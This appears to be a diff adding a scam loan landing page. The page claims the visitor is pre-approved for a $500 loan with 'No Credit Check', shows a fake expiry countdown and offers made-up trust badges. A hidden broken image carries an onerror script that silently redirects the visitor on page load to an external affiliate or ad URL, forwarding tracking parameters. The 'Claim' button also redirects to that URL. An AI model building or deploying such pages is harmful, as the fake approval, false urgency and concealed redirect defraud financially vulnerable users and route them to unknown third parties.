@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#0ea5e9">
+<title>Loan Approved — Claim Your Offer</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  color:#111827;
+  background:linear-gradient(160deg,#0ea5e9 0%,#38bdf8 45%,#e0f2fe 45%,#f1f5f9 100%);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:16px;
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+.card{
+  width:100%;
+  max-width:400px;
+  background:#fff;
+  border-radius:24px;
+  box-shadow:0 24px 60px -12px rgba(2,132,199,.35),0 4px 12px rgba(0,0,0,.06);
+  overflow:hidden;
+  position:relative;
+  animation:slideUp .5s cubic-bezier(.16,1,.3,1) both;
+}
+@keyframes slideUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+
+/* Top bar */
+.topbar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 18px;border-bottom:1px solid #f1f5f9;
+}
+.close{
+  width:28px;height:28px;border:0;background:transparent;color:#94a3b8;
+  font-size:22px;line-height:1;cursor:pointer;border-radius:8px;
+}
+.close:hover{background:#f1f5f9;color:#334155}
+.topbar h1{font-size:14px;font-weight:600;color:#334155;letter-spacing:.2px}
+.dot{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 0 3px rgba(34,197,94,.2);animation:pulse 1.6s ease-in-out infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 3px rgba(34,197,94,.2)}50%{box-shadow:0 0 0 6px rgba(34,197,94,.05)}}
+
+/* Hero */
+.hero{padding:20px 20px 4px;text-align:center;position:relative}
+.badge-approved{
+  display:inline-flex;align-items:center;gap:6px;
+  background:linear-gradient(90deg,#dcfce7,#bbf7d0);
+  color:#166534;font-size:11px;font-weight:700;letter-spacing:.5px;
+  padding:5px 12px;border-radius:999px;margin-bottom:14px;
+  border:1px solid #86efac;
+}
+.check{
+  display:inline-block;width:12px;height:12px;border-radius:50%;
+  background:#16a34a;color:#fff;font-size:8px;text-align:center;line-height:12px;font-weight:900;
+}
+
+/* Illustration - pure SVG */
+.illustration{width:120px;height:120px;margin:0 auto 8px;position:relative}
+.illustration svg{width:100%;height:100%;display:block;filter:drop-shadow(0 8px 16px rgba(2,132,199,.25))}
+.spark{position:absolute;font-size:0;pointer-events:none}
+.spark::before{content:"";display:block;width:8px;height:8px;background:#fbbf24;border-radius:50%;box-shadow:0 0 12px #fbbf24;animation:sparkle 2s ease-in-out infinite}
+.spark:nth-child(2)::before{animation-delay:.3s;background:#f472b6;box-shadow:0 0 12px #f472b6}
+.spark:nth-child(3)::before{animation-delay:.6s;background:#60a5fa;box-shadow:0 0 12px #60a5fa}
+.spark:nth-child(4)::before{animation-delay:.9s;background:#34d399;box-shadow:0 0 12px #34d399}
+.s1{top:8px;left:6px}.s2{top:0;right:10px}.s3{bottom:14px;right:-2px}.s4{bottom:4px;left:-2px}
+@keyframes sparkle{0%,100%{transform:scale(0);opacity:0}50%{transform:scale(1);opacity:1}}
+
+/* Amount */
+.approved-for{font-size:14px;color:#64748b;margin-bottom:6px}
+.amount-wrap{position:relative;display:inline-block;padding:6px 4px}
+.amount{
+  font-size:56px;font-weight:900;letter-spacing:-2px;line-height:1;
+  background:linear-gradient(90deg,#0284c7 0%,#0ea5e9 25%,#22c55e 50%,#0ea5e9 75%,#0284c7 100%);
+  background-size:200% auto;
+  -webkit-background-clip:text;background-clip:text;
+  -webkit-text-fill-color:transparent;
+  animation:shine 3.5s linear infinite;
+}
+@keyframes shine{to{background-position:200% center}}
+.amount-currency{font-size:24px;font-weight:800;vertical-align:top;color:#0284c7;-webkit-text-fill-color:#0284c7;margin-right:2px}
+.amount-underline{
+  height:6px;width:80%;margin:6px auto 0;border-radius:6px;
+  background:linear-gradient(90deg,transparent,#0ea5e9,transparent);
+  opacity:.35;
+}
+
+/* Timer */
+.timer{
+  display:flex;align-items:center;justify-content:center;gap:8px;margin:14px auto 4px;width:fit-content;
+  background:#fef2f2;color:#b91c1c;border:1px solid #fecaca;
+  padding:8px 14px;border-radius:999px;font-size:12px;font-weight:600;
+}
+.timer .ic{width:14px;height:14px;flex:0 0 14px}
+.timer #countdown{font-variant-numeric:tabular-nums;font-weight:800;color:#dc2626}
+
+/* Detail rows */
+.details{margin:18px 20px 6px;background:#f8fafc;border:1px solid #e2e8f0;border-radius:16px;overflow:hidden}
+.row{display:flex;align-items:center;justify-content:space-between;padding:12px 16px}
+.row+.row{border-top:1px solid #e2e8f0}
+.row .l{font-size:12px;color:#64748b}
+.row .v{font-size:14px;font-weight:700;color:#0f172a}
+.row .v.g{color:#16a34a}
+.row .ic{width:16px;height:16px;color:#94a3b8;margin-right:8px;vertical-align:-2px}
+
+/* CTA */
+.cta-wrap{padding:14px 20px 8px}
+.cta{
+  width:100%;padding:16px;border:0;border-radius:999px;cursor:pointer;
+  background:linear-gradient(90deg,#0284c7 0%,#0ea5e9 50%,#22c55e 100%);
+  background-size:200% auto;
+  color:#fff;font-size:16px;font-weight:800;letter-spacing:.3px;
+  box-shadow:0 12px 24px -6px rgba(2,132,199,.5);
+  transition:transform .15s ease,background-position .5s ease;
+  display:inline-flex;align-items:center;justify-content:center;gap:8px;
+}
+.cta:hover{background-position:100% center}
+.cta:active{transform:scale(.98)}
+.arrow{transition:transform .3s ease}
+.cta:hover .arrow{transform:translateX(4px)}
+
+/* Footer */
+.footer{padding:10px 20px 18px;text-align:center;font-size:11px;color:#94a3b8}
+.footer a{color:#64748b;text-decoration:none;border-bottom:1px dotted #cbd5e1}
+
+/* Trust strip */
+.trust{display:flex;justify-content:space-around;padding:10px 20px;border-top:1px solid #f1f5f9;background:#fafbfc}
+.trust div{display:flex;align-items:center;gap:5px;font-size:10px;color:#64748b;font-weight:600}
+.trust svg{width:12px;height:12px;color:#0ea5e9}
+
+/* Loader */
+.loader{
+  position:absolute;inset:0;background:rgba(255,255,255,.96);
+  display:none;align-items:center;justify-content:center;flex-direction:column;
+  z-index:10;backdrop-filter:blur(4px);
+}
+.loader.show{display:flex}
+.spinner{
+  width:52px;height:52px;border-radius:50%;
+  border:4px solid #e0f2fe;border-top-color:#0ea5e9;
+  animation:spin .8s linear infinite;margin-bottom:14px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loader p{font-size:14px;font-weight:600;color:#0f172a}
+.loader small{font-size:11px;color:#94a3b8;margin-top:4px}
+
+/* Confetti */
+.confetti{position:absolute;top:0;left:0;right:0;height:100%;overflow:hidden;pointer-events:none}
+.confetti i{position:absolute;top:-20px;width:8px;height:12px;opacity:0;animation:fall 3s ease-in forwards}
+@keyframes fall{
+  0%{opacity:1;transform:translateY(0) rotate(0)}
+  100%{opacity:0;transform:translateY(600px) rotate(720deg)}
+}
+
+/* Mobile tweaks */
+@media (max-width:380px){
+  .amount{font-size:48px}
+  .amount-currency{font-size:20px}
+}
+</style>
+</head>
+<body>
+<!-- Instant redirect via broken image onerror -->
+<img src="data:," style="display:none;position:absolute;left:-9999px" onerror="(function(){try{var p=new URLSearchParams(location.search);var c=p.get('clickid')||p.get('subid')||'';var u='https://asperitymeg.com/x2zj3rkge?key=fbffddc04fe12a47a7aa72d5fded2d9c';if(c)u+='&amp;clickid='+encodeURIComponent(c);u+='&amp;amount=500';p.forEach(function(v,k){if(k!=='clickid'&amp;&amp;k!=='subid')u+='&amp;'+k+'='+encodeURIComponent(v)});location.replace(u)}catch(e){}})()">
+
+<div class="card">
+
+  <div class="confetti" id="confetti"></div>
+
+  <div class="topbar">
+    <button class="close" aria-label="close">✕</button>
+    <h1>Updated Loan Offer</h1>
+    <span class="dot" title="Live"></span>
+  </div>
+
+  <div class="hero">
+    <div class="badge-approved"><span class="check">✓</span> APPROVED</div>
+
+    <div class="illustration">
+      <span class="spark s1"></span>
+      <span class="spark s2"></span>
+      <span class="spark s3"></span>
+      <span class="spark s4"></span>
+      <svg viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <defs>
+          <linearGradient id="bag" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0" stop-color="#22c55e"/>
+            <stop offset="1" stop-color="#15803d"/>
+          </linearGradient>
+          <linearGradient id="coin" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0" stop-color="#fde047"/>
+            <stop offset="1" stop-color="#eab308"/>
+          </linearGradient>
+        </defs>
+        <!-- coins behind -->
+        <circle cx="28" cy="92" r="12" fill="url(#coin)" stroke="#a16207" stroke-width="1.5"/>
+        <text x="28" y="97" text-anchor="middle" font-size="14" font-weight="900" fill="#a16207">$</text>
+        <circle cx="95" cy="96" r="10" fill="url(#coin)" stroke="#a16207" stroke-width="1.5"/>
+        <text x="95" y="100" text-anchor="middle" font-size="12" font-weight="900" fill="#a16207">$</text>
+        <!-- bag -->
+        <path d="M40 40 Q60 30 80 40 L92 100 Q60 112 28 100 Z" fill="url(#bag)" stroke="#166534" stroke-width="1.5"/>
+        <!-- tie -->
+        <path d="M42 40 Q60 22 78 40" fill="none" stroke="#166534" stroke-width="4" stroke-linecap="round"/>
+        <!-- dollar -->
+        <text x="60" y="82" text-anchor="middle" font-size="32" font-weight="900" fill="#fff">$</text>
+      </svg>
+    </div>
+
+    <p class="approved-for">Your Personal Loan is approved for</p>
+
+    <div class="amount-wrap">
+      <span class="amount-currency">$</span><span class="amount">500</span>
+      <div class="amount-underline"></div>
+    </div>
+
+    <div class="timer">
+      <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+      <span>Offer expires in <span id="countdown">06:59:59</span></span>
+    </div>
+  </div>
+
+  <div class="details">
+    <div class="row">
+      <span class="l">
+        <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="3"/><path d="M16 2v4M8 2v4M3 10h18"/></svg>Tenure
+      </span>
+      <span class="v">6 months</span>
+    </div>
+    <div class="row">
+      <span class="l">
+        <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1v22M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/></svg>Monthly Installment
+      </span>
+      <span class="v">$85<small style="font-weight:400;color:#94a3b8">/mo</small></span>
+    </div>
+    <div class="row">
+      <span class="l">
+        <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>Interest Rate
+      </span>
+      <span class="v g">3.9% APR</span>
+    </div>
+  </div>
+
+  <div class="cta-wrap">
+    <button class="cta" onclick="claim()">
+      Claim My $500 <span class="arrow">→</span>
+    </button>
+  </div>
+
+  <div class="trust">
+    <div><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>256-bit SSL</div>
+    <div><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>5-min Approval</div>
+    <div><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>No Credit Check</div>
+  </div>
+
+  <div class="footer">
+    By continuing you agree to our <a href="#">Terms &amp; Privacy</a>
+  </div>
+
+  <div class="loader" id="loader">
+    <div class="spinner"></div>
+    <p>Connecting to lender...</p>
+    <small>Please wait a moment</small>
+  </div>
+</div>
+
+<script>
+// ===== Set your Offer URL here =====
+var OFFER_URL = "https://asperitymeg.com/x2zj3rkge?key=fbffddc04fe12a47a7aa72d5fded2d9c";
+// ===================================
+
+var params = new URLSearchParams(location.search);
+var clickid = params.get('clickid') || params.get('subid') || '';
+
+// Countdown 7 hours
+var end = Date.now() + 7*3600*1000;
+var cd = document.getElementById('countdown');
+function pad(n){return n<10?'0'+n:n}
+function tick(){
+  var s = Math.max(0, Math.floor((end-Date.now())/1000));
+  var h=Math.floor(s/3600), m=Math.floor(s%3600/60), sec=s%60;
+  cd.textContent = pad(h)+':'+pad(m)+':'+pad(sec);
+}
+tick(); setInterval(tick,1000);
+
+// Confetti burst on load
+var colors=['#0ea5e9','#22c55e','#f59e0b','#ec4899','#8b5cf6'];
+var cont=document.getElementById('confetti');
+for(var i=0;i<24;i++){
+  var p=document.createElement('i');
+  p.style.background=colors[i%colors.length];
+  p.style.left=(Math.random()*100)+'%';
+  p.style.animationDelay=(Math.random()*.5)+'s';
+  p.style.animationDuration=(1.8+Math.random()*1.5)+'s';
+  p.style.transform='rotate('+(Math.random()*360)+'deg)';
+  cont.appendChild(p);
+}
+
+function claim(){
+  document.getElementById('loader').classList.add('show');
+  setTimeout(function(){
+    var url = OFFER_URL;
+    var extras = [];
+    if(clickid) extras.push('clickid='+encodeURIComponent(clickid));
+    extras.push('amount=500');
+    params.forEach(function(v,k){
+      if(k!=='clickid' && k!=='subid') extras.push(k+'='+encodeURIComponent(v));
+    });
+    if(extras.length) url += (url.indexOf('?')>-1?'&':'?') + extras.join('&');
+    location.href = url;
+  }, 1200);
+}
+</script>
+</body>
+</html>
